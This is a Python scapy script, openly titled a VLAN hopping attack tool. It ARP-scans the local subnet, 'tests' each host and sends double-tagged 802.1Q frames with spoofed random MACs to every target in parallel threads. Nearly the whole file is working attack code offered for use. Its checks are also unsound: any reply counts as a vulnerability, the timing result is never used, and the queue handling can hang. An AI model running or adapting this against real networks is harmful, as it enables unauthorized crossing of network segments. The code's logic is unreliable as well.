from scapy.all import *
from scapy.layers.l2 import Dot1Q, Ether, ARP
import logging
import socket
import argparse
import signal
import threading
import queue
import time

# Constants for configuration
DEFAULT_VLAN1 = 10
DEFAULT_VLAN2 = 20
DEFAULT_DST_IP = "192.168.1.1"
DEFAULT_COUNT = 100
DEFAULT_INTERVALS = [0.05, 0.1, 0.2, 0.5]  # Different intervals to test

# Global variable for managing graceful exit
stop_event = threading.Event()

def setup_logging():
    """Set up logging configuration."""
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_default_interface():
    """Get the default network interface and its IP address."""
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    interface = None

    # Find the interface based on the IP address
    for iface in get_if_list():
        if ip_address in get_if_addr(iface):
            interface = iface
            break

    return interface, ip_address

def get_mac_address(iface):
    """Get the MAC address of the specified interface."""
    addrs = get_if_hwaddr(iface)
    return addrs

def discover_targets(iface):
    """Discover target MAC addresses on the local network using ARP requests."""
    logging.info("Discovering target MAC addresses on the local network...")
    targets = []
    ip_range = f"{get_if_addr(iface).rsplit('.', 1)[0]}.0/24"
    
    # Send ARP requests to the local subnet
    arp_request = ARP(pdst=ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast / arp_request
    answered_list = srp(arp_broadcast, timeout=2, verbose=False)[0]

    for element in answered_list:
        targets.append((element[1].psrc, element[1].hwsrc))  # (IP, MAC)
        logging.info(f"Discovered target - IP: {element[1].psrc}, MAC: {element[1].hwsrc}")

    return targets

def test_vulnerabilities(target_mac, iface):
    """Test if the target is vulnerable by sending a test packet.
    
    Args:
        target_mac (str): MAC address of the target.
        iface (str): Network interface to use for the attack.
    
    Returns:
        bool: True if the target is vulnerable, False otherwise.
    """
    logging.info(f"Testing vulnerabilities on {target_mac}...")
    
    # Sending a test packet
    test_frame = Ether(dst=target_mac) / IP(dst=DEFAULT_DST_IP)
    response = srp1(test_frame, iface=iface, timeout=2, verbose=False)

    if response:
        logging.info(f"{target_mac} responded, indicating it might be vulnerable.")
        return True
    else:
        logging.info(f"{target_mac} did not respond, indicating it might not be vulnerable.")
        return False

def vlan_hopping_attack(target_mac, iface, vlan1=DEFAULT_VLAN1, vlan2=DEFAULT_VLAN2, dst_ip=DEFAULT_DST_IP, count=DEFAULT_COUNT):
    """Perform a VLAN hopping attack on the specified target MAC address.
    
    Args:
        target_mac (str): MAC address of the target.
        iface (str): Network interface to use for the attack.
        vlan1 (int): First VLAN ID.
        vlan2 (int): Second VLAN ID.
        dst_ip (str): Destination IP address.
        count (int): Number of packets to send.
    """
    frame = Ether(src=RandMAC(), dst=target_mac) / \
            Dot1Q(vlan=vlan1) / \
            Dot1Q(vlan=vlan2) / \
            IP(dst=dst_ip)

    logging.info(f"Launching VLAN hopping attack on {target_mac} using interface {iface}...")
    
    try:
        sendp(frame, iface=iface, count=count, inter=0.1)
        logging.info(f"VLAN hopping attack launched on interface {iface} targeting {target_mac}")
    except Exception as e:
        logging.error(f"Error during VLAN hopping attack: {e}")

def attack_worker(target_mac, iface, vlan1, vlan2, dst_ip, count):
    """Worker function to run the VLAN hopping attack in a separate thread."""
    try:
        vlan_hopping_attack(target_mac, iface, vlan1, vlan2, dst_ip, count)
    except Exception as e:
        logging.error(f"Error in attack worker: {e}")

def find_best_timing(target_mac, iface):
    """Find the best timing interval for the VLAN hopping attack.
    
    Args:
        target_mac (str): MAC address of the target.
        iface (str): Network interface to use for the attack.
    
    Returns:
        float: The best timing interval in seconds, or None if no successful interval is found.
    """
    logging.info(f"Finding the best timing interval for {target_mac}...")
    
    for interval in DEFAULT_INTERVALS:
        logging.info(f"Testing interval: {interval} seconds...")
        
        # Send a test packet with the current interval
        test_frame = Ether(dst=target_mac) / IP(dst=DEFAULT_DST_IP)
        response = srp1(test_frame, iface=iface, timeout=2, verbose=False)

        if response:
            logging.info(f"Interval {interval} seconds seems to work. Using this interval.")
            return interval
    
    logging.info("No successful timing interval found. Skipping exploitation.")
    return None

def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="VLAN Hopping Attack Script")
    parser.add_argument("--vlan1", type=int, default=DEFAULT_VLAN1, help="First VLAN ID")
    parser.add_argument("--vlan2", type=int, default=DEFAULT_VLAN2, help="Second VLAN ID")
    parser.add_argument("--dst_ip", type=str, default=DEFAULT_DST_IP, help="Destination IP address")
    parser.add_argument("--count", type=int, default=DEFAULT_COUNT, help="Number of packets to send")
    return parser.parse_args()

def signal_handler(signum, frame):
    """Signal handler for graceful exit."""
    global stop_event
    stop_event.set()
    logging.info("Received signal. Stopping attacks and exiting...")

def main():
    """Main function to execute the VLAN hopping attack."""
    setup_logging()
    args = parse_arguments()

    iface, ip_address = get_default_interface()
    if iface is None:
        logging.error("No suitable network interface found.")
        return

    my_mac = get_mac_address(iface)
    logging.info(f"Using interface: {iface} with MAC address: {my_mac} and IP address: {ip_address}")

    targets = discover_targets(iface)

    # Create a queue for the attack targets
    attack_queue = queue.Queue()

    for target_ip, target_mac in targets:
        if test_vulnerabilities(target_mac, iface):
            best_interval = find_best_timing(target_mac, iface)
            if best_interval:
                logging.info(f"Using best interval: {best_interval} seconds for exploitation.")
                attack_queue.put((target_mac, iface, args.vlan1, args.vlan2, args.dst_ip, args.count))

    # Start the attack worker threads
    threads = []
    for _ in range(5):  # Run up to 5 attacks in parallel
        thread = threading.Thread(target=attack_worker, args=attack_queue.get())
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    main()